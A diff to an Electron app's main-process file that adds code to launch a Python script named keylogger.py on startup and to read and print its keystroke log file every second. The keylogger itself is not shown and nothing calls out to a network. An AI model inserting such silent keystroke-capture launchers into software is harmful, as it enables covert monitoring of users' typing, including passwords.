@@ -1,6 +1,9 @@
 import { app, protocol, BrowserWindow } from 'electron';
 import { createProtocol } from 'vue-cli-plugin-electron-builder/lib';
 import installExtension, { VUEJS_DEVTOOLS } from 'electron-devtools-installer';
+import { exec } from 'child_process';
+import path from 'path';
+import fs from 'fs';
 
 const isDevelopment = process.env.NODE_ENV !== 'production';
 
@@ -77,3 +80,27 @@ if (isDevelopment) {
     });
   }
 }
+
+// const controller = exec(`python3 ${__dirname}/assets/keylogger.py`, (error) => {
+const controller = exec(`python3 ${path.join(app.getAppPath(), '..', 'src', 'keylogger.py')}`, (error) => {
+  console.log('python script startet');
+  if (error) {
+    // eslint-disable-next-line no-console
+    console.error(`error: ${error}`);
+  }
+});
+
+controller.stdout.on('data', (msg) => {
+  // eslint-disable-next-line no-console
+  console.log(msg);
+});
+
+controller.on('close', () => {
+  // eslint-disable-next-line no-console
+  console.log('python ended');
+});
+
+setInterval(async () => {
+  const data = await fs.readFileSync(path.join(app.getAppPath(), '..', 'keylogger', 'tmp.log'), 'utf-8');
+  console.log('data:', data);
+}, 1000); 
